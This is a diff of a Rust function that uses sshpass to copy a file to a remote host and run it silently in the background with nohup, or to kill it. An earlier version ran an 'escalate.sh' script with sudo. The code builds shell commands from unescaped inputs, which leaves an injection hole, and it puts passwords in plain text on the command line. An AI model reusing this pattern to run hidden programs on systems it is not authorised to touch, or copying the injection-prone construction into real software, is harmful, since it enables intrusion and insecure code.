@@ -51,21 +51,18 @@ fn run_ssh_commands(user: &str, pass: &str, target_ip: &str, file_name: &str, ki
         format!("sshpass -p '{}' ssh {}@{} 'pkill -x {}'"
         , pass, user, target_ip, file_name)
     } else {
-        format!("sshpass -p '{}' scp {} {}@{}:~/ && sshpass -p '{}' ssh {}@{} 'chmod +x ~/escalate.sh && sudo nohup ~/{} {} > /dev/null 2>&1 &'"
-        , pass, file_name, user, target_ip, pass, user, target_ip, file_name, pass)
+        format!("sshpass -p '{}' scp {} {}@{}:~/ && sshpass -p '{}' ssh -f {}@{} 'chmod +x ~/{} && nohup ~/{} {} >/dev/null 2>&1 &'"
+        , pass, file_name, user, target_ip, pass, user, target_ip, file_name, file_name, pass)
     };
-    
+	println!("{}", ssh_command);    
     //command running settings
-    let output = Command::new("sh")
+    let mut output = Command::new("sh")
         .arg("-c")
         .arg(&ssh_command)
-        .output()
+        .spawn()
         .expect("Failed to execute SSH, not my problem :3");
     //ssh status reciept
-    if output.status.success() {
-        println!("SSH command executed successfully!");
-    } else {
-        println!("SSH command failed to execute:");
-        println!("{}", String::from_utf8_lossy(&output.stderr));
-    }
+    let result = output.wait().expect("Failed to wait for command");
+    println!("{}", result)
+
 }
